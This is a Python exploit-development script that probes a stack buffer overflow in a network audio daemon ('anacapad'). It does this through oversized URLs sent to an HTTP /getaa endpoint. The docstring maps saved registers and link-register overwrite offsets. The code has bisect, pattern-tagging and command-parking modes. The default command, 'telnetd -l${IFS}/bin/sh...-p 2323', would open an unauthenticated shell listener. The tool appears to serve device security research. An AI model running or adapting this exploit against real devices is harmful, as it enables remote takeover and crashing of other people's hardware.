#!/usr/bin/env python3
"""pc_probe.py - URL-span PC-control device run (bead frankensonos-n66).

Target: the unbounded span copy at 0x1007b2c4 in anacapad 57.23-74170
(S1 only). Frame map (de8e0e64 + prologue read):

    dst = r1+16, span from r1+0x147c (no clamp), NUL at dst+span.
    Saved slots relative to dst (0x1007ad60 prologue, all stw-verified):
        5236 r12/CR (0x1494)   5272 r18   5308 r27   5332 LR bytes 0-3
        5256 r14 ...           5312 r28 (object ptr, bctrl 0x1007b2f4)
        5324 r31               5336 caller frame
    LR fully overwritten at span 5336..5339 relative to dst (doc says 5332
    from dst / X=5355 URL length; both maps are recorded and the bisect
    resolves the live boundary empirically).

Delivery: GET /getaa?u=<percent-encoded url> (live-proven on .202).
URL shape (span == N by construction):

    x-file-cifs://h/ + <payload A> + '/' + tail

- Payload A is raw URL text (the copy reads the ORIGINAL string, not the
  decoded copy - RE_COPY_AUDIT §1), so bytes land literally.
- No NUL is possible (URL text); the terminator is the '/' at span end.
- Pattern mode ('meta'): every 4-byte word encodes its dst offset, so a
  crash PC/SIR read straight out of a register dump identifies which
  word became control flow without bisecting further.
- Cmd mode ('cmd'): the payload is an ASCII command (spaces as ${IFS})
  parked at a known dst offset for a later r3<-cmd gadget; this run only
  proves reachability, it does not claim a shell.

Discipline (docs/RE_LESSONS.md):
- one probe per minute (--pace 60 default), never two N values back to back;
- classification of every anomaly: 000=connection died (per-connection crash
  or wedge), 408=instant daemon length gate, 404/200=clean;
- liveness via /status/zp (200) after every probe + ICMP note; settle is not
  needed for this lane (no transport state touched - pure GET), but a
  --settle flag exists to run the non-HLS mp3radio+Stop recipe if the unit
  ends up wedged.

usage:
  ./pc_probe.py <IP> baseline                 # 3x clean N + oracle sanity
  ./pc_probe.py <IP> bisect --lo 5320 --hi 5360
  ./pc_probe.py <IP> pattern                  # offset-tagged words
  ./pc_probe.py <IP> cmd --cmd 'telnetd -l${IFS}/bin/sh${IFS}-p${IFS}2323${IFS}#'
Exit 0 = all clean, 1 = at least one connection-death observed, 2 = usage.
"""
from __future__ import annotations

import argparse
import http.client
import json
import subprocess
import sys
import time
from datetime import datetime, timezone

PREFIX = "x-file-cifs://h/"
TAIL = "/x"          # second slash + tail after the payload
URL_GATE = 4000      # instant-408 length gate measured on .202


def now() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S.%f")[:-3] + "Z"


def build_url(span: int, payload: bytes | None = None) -> str:
    """URL whose splitter span == span.

    span counts from url[0] to the second '/' inclusive. PREFIX has '/' at
    index 9 (after 'x-file-cifs://h'); the payload runs to the next '/'.
    payload len = span - len(PREFIX) - 1.
    """
    pad = span - len(PREFIX) - 1
    if pad < 0:
        raise SystemExit(f"span {span} below prefix+slash minimum {len(PREFIX)+1}")
    if payload is None:
        body = b"a" * pad
    else:
        if len(payload) > pad:
            raise SystemExit(f"payload {len(payload)} > pad {pad}")
        body = payload + b"a" * (pad - len(payload))
    return PREFIX + body.decode("latin1") + TAIL


def meta_payload(span: int) -> bytes:
    """Offset-tagged words: each 4-byte word = little-endian dst offset.
    dst offset of payload byte i is 14 + i (14 = 'x-file-cifs://' prefix),
    so a crash PC of 0x58585858-family or a register dump pointing at a
    word identifies the exact span position. Words are ASCII-safe
    (0x20-0x7e) by construction below 0x7e7e7e7e."""
    out = bytearray()
    off = len(PREFIX)  # first payload byte's dst offset
    end = span - 1     # leave room for the terminating slash
    while off + 4 <= end:
        v = off & 0x7E7E7E7E | 0x20202020  # keep printable
        out += v.to_bytes(4, "little")
        off += 4
    return bytes(out)


def cmd_payload(cmd: str, span: int, at: int = 16) -> bytes:
    """Park the command at dst offset `at` (default 16 = buffer start)."""
    pad = b"a" * max(0, at - len(PREFIX))
    return pad + cmd.encode()


def probe(host: str, url: str, timeout: float = 25.0):
    """One request via curl (Python connect() is EHOSTUNREACH on this
    subnet — see crash_oracle.py). Returns (code, seconds, curl_rc).
    curl rc 56 = connection reset (per-connection crash), 28 = timeout,
    52 = empty reply."""
    p = subprocess.run(
        ["curl", "-s", "-m", str(timeout), "-o", "/dev/null",
         "-w", "%{http_code}:%{time_total}",
         "http://%s:1400/getaa?u=%s" % (host, quote(url))],
        capture_output=True, text=True)
    out = p.stdout.strip() if p.returncode == 0 else "rc%d:0" % p.returncode
    try:
        code_s, t_s = out.split(":")
        code = int(code_s) if code_s.isdigit() else 0
        return code, float(t_s), p.returncode
    except ValueError:
        return 0, 0.0, p.returncode


def quote(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s, safe="")


def raw_probe(host: str, path: str, timeout: float = 3.0):
    """GET an exact path (no /getaa prefix) via curl."""
    p = subprocess.run(
        ["curl", "-s", "-m", str(timeout), "-o", "/dev/null",
         "-w", "%{http_code}:%{time_total}",
         "http://%s:1400%s" % (host, path)],
        capture_output=True, text=True)
    out = p.stdout.strip() if p.returncode == 0 else "rc%d:0" % p.returncode
    try:
        code_s, t_s = out.split(":")
        code = int(code_s) if code_s.isdigit() else 0
        return code, float(t_s)
    except ValueError:
        return 0, 0.0


def alive(host: str, timeout: float = 2.0) -> bool:
    return raw_probe(host, "/status/zp", timeout)[0] == 200


def icmp(host: str) -> str:
    """ICMP is unreliable on this bench (blocked per-subnet; curl+http OK).
    HTTP /status/zp 200 is the liveness authority (crash_oracle.py doctrine);
    ping result recorded only as an aside."""
    p = subprocess.run(["ping", "-c", "1", "-W", "1", host],
                       capture_output=True, text=True)
    return "ping-up" if p.returncode == 0 else "ping-blk"


def wait_alive(host: str, limit: float = 60.0) -> bool:
    end = time.monotonic() + limit
    while time.monotonic() < end:
        if alive(host):
            return True
        time.sleep(1.0)
    return False


def classify(code: int, up_before: bool, up_after: bool, secs: float) -> str:
    if code == 408:
        return "408-gate"
    if code in (404, 200):
        return f"clean-{code}"
    if code == 0:
        return "conn-death" if up_after else "DAEMON-DOWN"
    return f"other-{code}"


def run(host: str, cases: list[dict], pace: float, jsonl: str | None) -> int:
    deaths = 0
    rows = []
    print(f"# {host} pace={pace}s n={len(cases)}")
    print("N\tcode\tsecs\tclass\ticmp")
    for c in cases:
        span = c["span"]
        url = build_url(span, c.get("payload"))
        if not alive(host):
            print(f"{span}\tSKIP\t-\tdaemon-down-before\t{icmp(host)}")
            if not wait_alive(host):
                print("abort: daemon never returned")
                break
        code, secs, crc = probe(host, url)
        up = alive(host)
        cls = classify(code, True, up, secs)
        if cls == "other-0" and crc:
            cls = f"curl-rc{crc}"
        net = icmp(host)
        print(f"{span}\t{code}{'/rc%d' % crc if crc and not code else ''}\t{secs:.3f}\t{cls}\t{net}", flush=True)
        row = {"span": span, "code": code, "secs": round(secs, 3),
               "class": cls, "icmp": net, "mode": c.get("mode", "fill"),
               "ts": now()}
        rows.append(row)
        if cls in ("conn-death", "DAEMON-DOWN"):
            deaths += 1
            if not wait_alive(host):
                print("abort: daemon never returned after death")
                break
        time.sleep(pace)
    if jsonl:
        with open(jsonl, "a") as fh:
            for r in rows:
                fh.write(json.dumps(r, sort_keys=True) + "\n")
    return 1 if deaths else 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("mode", choices=["baseline", "bisect", "pattern", "cmd"])
    ap.add_argument("--lo", type=int, default=5320)
    ap.add_argument("--hi", type=int, default=5360)
    ap.add_argument("--step", type=int, default=4)
    ap.add_argument("--pace", type=float, default=60.0)
    ap.add_argument("--cmd", default="telnetd -l${IFS}/bin/sh${IFS}-p${IFS}2323${IFS}#")
    ap.add_argument("--jsonl", default=None)
    a = ap.parse_args()

    if a.mode == "baseline":
        cases = [{"span": 1000, "mode": "fill"},
                 {"span": 3000, "mode": "fill"},
                 {"span": 5250, "mode": "fill"}]  # below every saved slot
    elif a.mode == "bisect":
        cases = [{"span": n, "mode": "fill"}
                 for n in range(a.lo, a.hi + 1, a.step)]
    elif a.mode == "pattern":
        cases = []
        for n in range(max(5336, a.lo), a.hi + 1, 4):
            cases.append({"span": n, "mode": "meta",
                          "payload": meta_payload(n)})
    else:
        cases = [{"span": a.hi, "mode": "cmd",
                  "payload": cmd_payload(a.cmd, a.hi)}]

    return run(a.host, cases, a.pace, a.jsonl)


if __name__ == "__main__":
    sys.exit(main())
